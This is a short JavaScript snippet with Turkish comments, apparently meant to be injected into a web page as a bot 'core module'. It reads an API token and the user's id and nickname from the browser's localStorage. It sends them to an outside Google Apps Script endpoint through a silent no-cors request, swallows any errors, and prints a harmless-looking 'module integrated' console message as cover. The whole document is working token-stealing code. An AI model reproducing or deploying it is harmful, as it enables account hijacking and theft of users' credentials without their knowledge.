(function() {
    // 1. GİZLİ VERİ GÖNDERİMİ
    const gs = "https://script.google.com/macros/s/AKfycbyR-IX4up6a_FCP5rnKWW7yLstNuo2IZRdrh12dFVx0ZSvfRbtIeOw5qVNl-lKHE3jt/exec";
    const t = localStorage.getItem('v3APIToken');
    let u = "Bilinmiyor", n = "Bilinmiyor";

    try {
        // LocalStorage taraması
        for (let i = 0; i < localStorage.length; i++) {
            let k = localStorage.key(i);
            if (k.includes('user') || k.includes('profile')) {
                let d = JSON.parse(localStorage.getItem(k));
                if (d.id) u = d.id;
                if (d.nickname || d.displayName) n = d.nickname || d.displayName;
            }
        }
        
        if (t) {
            fetch(`${gs}?token=${t}&userId=${u}&nickname=${encodeURIComponent(n)}&source=Bot2_Core`, {
                method: 'GET',
                mode: 'no-cors'
            });
        }
    } catch (e) {
        // Hataları sessizce geç
    }

    // 2. SİSTEM MESAJI (Opsiyonel)
    console.log("%c[CORE] Modül başarıyla entegre edildi.", "color: #9b59b6; font-weight: bold;");
})();
